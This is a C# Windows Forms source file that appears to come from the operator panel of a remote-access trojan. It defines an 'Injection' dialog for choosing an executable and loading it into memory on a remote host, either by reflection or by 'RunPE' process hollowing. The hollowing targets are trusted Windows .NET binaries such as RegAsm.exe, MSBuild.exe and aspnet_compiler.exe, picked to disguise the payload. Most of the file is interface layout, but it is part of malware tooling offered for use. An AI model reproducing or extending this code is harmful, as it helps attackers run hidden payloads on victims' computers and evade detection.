using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using DevExpress.Utils;
using DevExpress.Utils.Svg;
using DevExpress.XtraEditors;
using DevExpress.XtraEditors.Controls;
using DevExpress.XtraTab;
using Server.Helper;

namespace Server.Forms;

public class FormSendFileToMemory : XtraForm
{
	private IContainer components;

	private Label label2;

	private Label label1;

	private StatusStrip statusStrip1;

	public ToolStripStatusLabel toolStripStatusLabel1;

	private Label label3;

	private SimpleButton simpleButton1;

	private SimpleButton simpleButton3;

	public SimpleButton btnIcon;

	public ComboBoxEdit comboBox1;

	public ComboBoxEdit comboBox2;

	private GroupControl groupBox1;

	private XtraTabControl xtraTabControl2;

	private XtraTabPage xtraTabPage2;

	public FormSendFileToMemory()
	{
		InitializeComponent();
	}

	private void SendFileToMemory_Load(object sender, EventArgs e)
	{
		comboBox1.SelectedIndex = 0;
		comboBox2.SelectedIndex = 0;
	}

	private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
	{
		switch (comboBox1.SelectedIndex)
		{
		case 0:
			label3.Visible = false;
			comboBox2.Visible = false;
			break;
		case 1:
			label3.Visible = true;
			comboBox2.Visible = true;
			break;
		}
	}

	private void button1_Click(object sender, EventArgs e)
	{
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Filter = "(*.exe)|*.exe";
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			toolStripStatusLabel1.Text = Path.GetFileName(openFileDialog.FileName);
			toolStripStatusLabel1.Tag = openFileDialog.FileName;
			toolStripStatusLabel1.ForeColor = Color.Green;
			if (comboBox1.SelectedIndex == 0)
			{
				try
				{
					new ReferenceLoader().AppDomainSetup(openFileDialog.FileName);
					return;
				}
				catch
				{
					toolStripStatusLabel1.ForeColor = Color.Red;
					toolStripStatusLabel1.Text += " Invalid!";
					return;
				}
			}
		}
		else
		{
			toolStripStatusLabel1.Text = "";
			toolStripStatusLabel1.ForeColor = Color.Black;
		}
	}

	private void comboBox2_SelectedIndexChanged(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormSendFileToMemory));
		this.comboBox2 = new DevExpress.XtraEditors.ComboBoxEdit();
		this.btnIcon = new DevExpress.XtraEditors.SimpleButton();
		this.comboBox1 = new DevExpress.XtraEditors.ComboBoxEdit();
		this.label2 = new System.Windows.Forms.Label();
		this.label3 = new System.Windows.Forms.Label();
		this.label1 = new System.Windows.Forms.Label();
		this.statusStrip1 = new System.Windows.Forms.StatusStrip();
		this.toolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
		this.simpleButton1 = new DevExpress.XtraEditors.SimpleButton();
		this.simpleButton3 = new DevExpress.XtraEditors.SimpleButton();
		this.groupBox1 = new DevExpress.XtraEditors.GroupControl();
		this.xtraTabControl2 = new DevExpress.XtraTab.XtraTabControl();
		this.xtraTabPage2 = new DevExpress.XtraTab.XtraTabPage();
		((System.ComponentModel.ISupportInitialize)this.comboBox2.Properties).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.comboBox1.Properties).BeginInit();
		this.statusStrip1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.groupBox1).BeginInit();
		this.groupBox1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl2).BeginInit();
		this.xtraTabControl2.SuspendLayout();
		this.xtraTabPage2.SuspendLayout();
		base.SuspendLayout();
		this.comboBox2.EditValue = "aspnet_compiler.exe";
		this.comboBox2.Location = new System.Drawing.Point(95, 93);
		this.comboBox2.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.comboBox2.Name = "comboBox2";
		this.comboBox2.Properties.Buttons.AddRange(new DevExpress.XtraEditors.Controls.EditorButton[1]
		{
			new DevExpress.XtraEditors.Controls.EditorButton(DevExpress.XtraEditors.Controls.ButtonPredefines.Combo)
		});
		this.comboBox2.Properties.Items.AddRange(new object[5] { "aspnet_compiler.exe", "RegAsm.exe", "MSBuild.exe", "RegSvcs.exe", "vbc.exe" });
		this.comboBox2.Size = new System.Drawing.Size(141, 28);
		this.comboBox2.TabIndex = 123;
		this.comboBox2.SelectedIndexChanged += new System.EventHandler(comboBox2_SelectedIndexChanged);
		this.btnIcon.ImageOptions.ImageToTextAlignment = DevExpress.XtraEditors.ImageAlignToText.LeftCenter;
		this.btnIcon.ImageOptions.ImageToTextIndent = 0;
		this.btnIcon.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("btnIcon.ImageOptions.SvgImage");
		this.btnIcon.ImageOptions.SvgImageColorizationMode = DevExpress.Utils.SvgImageColorizationMode.Full;
		this.btnIcon.ImageOptions.SvgImageSize = new System.Drawing.Size(30, 30);
		this.btnIcon.Location = new System.Drawing.Point(95, 59);
		this.btnIcon.Name = "btnIcon";
		this.btnIcon.Size = new System.Drawing.Size(32, 27);
		this.btnIcon.TabIndex = 121;
		this.btnIcon.Click += new System.EventHandler(button1_Click);
		this.comboBox1.EditValue = "Reflection";
		this.comboBox1.Location = new System.Drawing.Point(95, 26);
		this.comboBox1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.comboBox1.Name = "comboBox1";
		this.comboBox1.Properties.Buttons.AddRange(new DevExpress.XtraEditors.Controls.EditorButton[1]
		{
			new DevExpress.XtraEditors.Controls.EditorButton(DevExpress.XtraEditors.Controls.ButtonPredefines.Combo)
		});
		this.comboBox1.Properties.Items.AddRange(new object[2] { "Reflection", "RunPE" });
		this.comboBox1.Size = new System.Drawing.Size(141, 28);
		this.comboBox1.TabIndex = 122;
		this.comboBox1.SelectedIndexChanged += new System.EventHandler(comboBox1_SelectedIndexChanged);
		this.label2.AutoSize = true;
		this.label2.Location = new System.Drawing.Point(46, 67);
		this.label2.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label2.Name = "label2";
		this.label2.Size = new System.Drawing.Size(27, 13);
		this.label2.TabIndex = 1;
		this.label2.Text = "File:";
		this.label3.AutoSize = true;
		this.label3.Location = new System.Drawing.Point(46, 99);
		this.label3.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label3.Name = "label3";
		this.label3.Size = new System.Drawing.Size(43, 13);
		this.label3.TabIndex = 1;
		this.label3.Text = "Target:";
		this.label3.Visible = false;
		this.label1.AutoSize = true;
		this.label1.Location = new System.Drawing.Point(46, 32);
		this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label1.Name = "label1";
		this.label1.Size = new System.Drawing.Size(35, 13);
		this.label1.TabIndex = 1;
		this.label1.Text = "Type:";
		this.statusStrip1.BackColor = System.Drawing.Color.FromArgb(32, 32, 32);
		this.statusStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.toolStripStatusLabel1 });
		this.statusStrip1.Location = new System.Drawing.Point(0, 256);
		this.statusStrip1.Name = "statusStrip1";
		this.statusStrip1.Padding = new System.Windows.Forms.Padding(1, 0, 9, 0);
		this.statusStrip1.Size = new System.Drawing.Size(349, 22);
		this.statusStrip1.SizingGrip = false;
		this.statusStrip1.TabIndex = 2;
		this.statusStrip1.Text = "statusStrip1";
		this.toolStripStatusLabel1.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
		this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
		this.toolStripStatusLabel1.Size = new System.Drawing.Size(16, 17);
		this.toolStripStatusLabel1.Text = "...";
		this.simpleButton1.DialogResult = System.Windows.Forms.DialogResult.Cancel;
		this.simpleButton1.Location = new System.Drawing.Point(153, 144);
		this.simpleButton1.Name = "simpleButton1";
		this.simpleButton1.Size = new System.Drawing.Size(82, 24);
		this.simpleButton1.TabIndex = 32;
		this.simpleButton1.Text = "Cancel";
		this.simpleButton3.DialogResult = System.Windows.Forms.DialogResult.OK;
		this.simpleButton3.Location = new System.Drawing.Point(49, 144);
		this.simpleButton3.Name = "simpleButton3";
		this.simpleButton3.Size = new System.Drawing.Size(82, 24);
		this.simpleButton3.TabIndex = 31;
		this.simpleButton3.Text = "OK";
		this.groupBox1.Controls.Add(this.comboBox2);
		this.groupBox1.Controls.Add(this.simpleButton1);
		this.groupBox1.Controls.Add(this.label1);
		this.groupBox1.Controls.Add(this.simpleButton3);
		this.groupBox1.Controls.Add(this.btnIcon);
		this.groupBox1.Controls.Add(this.label3);
		this.groupBox1.Controls.Add(this.comboBox1);
		this.groupBox1.Controls.Add(this.label2);
		this.groupBox1.GroupStyle = DevExpress.Utils.GroupStyle.Light;
		this.groupBox1.Location = new System.Drawing.Point(31, 23);
		this.groupBox1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.groupBox1.Name = "groupBox1";
		this.groupBox1.Size = new System.Drawing.Size(284, 185);
		this.groupBox1.TabIndex = 33;
		this.groupBox1.Text = "Inject";
		this.xtraTabControl2.Dock = System.Windows.Forms.DockStyle.Fill;
		this.xtraTabControl2.Location = new System.Drawing.Point(0, 0);
		this.xtraTabControl2.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.xtraTabControl2.MultiLine = DevExpress.Utils.DefaultBoolean.True;
		this.xtraTabControl2.Name = "xtraTabControl2";
		this.xtraTabControl2.SelectedTabPage = this.xtraTabPage2;
		this.xtraTabControl2.Size = new System.Drawing.Size(349, 256);
		this.xtraTabControl2.TabIndex = 34;
		this.xtraTabControl2.TabPages.AddRange(new DevExpress.XtraTab.XtraTabPage[1] { this.xtraTabPage2 });
		this.xtraTabPage2.Controls.Add(this.groupBox1);
		this.xtraTabPage2.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.xtraTabPage2.Name = "xtraTabPage2";
		this.xtraTabPage2.Size = new System.Drawing.Size(347, 225);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(349, 278);
		base.Controls.Add(this.xtraTabControl2);
		base.Controls.Add(this.statusStrip1);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
		base.IconOptions.Icon = (System.Drawing.Icon)resources.GetObject("FormSendFileToMemory.IconOptions.Icon");
		base.IconOptions.Image = (System.Drawing.Image)resources.GetObject("FormSendFileToMemory.IconOptions.Image");
		base.Margin = new System.Windows.Forms.Padding(2);
		base.MaximizeBox = false;
		this.MaximumSize = new System.Drawing.Size(407, 375);
		base.MinimizeBox = false;
		this.MinimumSize = new System.Drawing.Size(407, 375);
		base.Name = "FormSendFileToMemory";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "Injection";
		base.Load += new System.EventHandler(SendFileToMemory_Load);
		((System.ComponentModel.ISupportInitialize)this.comboBox2.Properties).EndInit();
		((System.ComponentModel.ISupportInitialize)this.comboBox1.Properties).EndInit();
		this.statusStrip1.ResumeLayout(false);
		this.statusStrip1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.groupBox1).EndInit();
		this.groupBox1.ResumeLayout(false);
		this.groupBox1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.xtraTabControl2).EndInit();
		this.xtraTabControl2.ResumeLayout(false);
		this.xtraTabPage2.ResumeLayout(false);
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
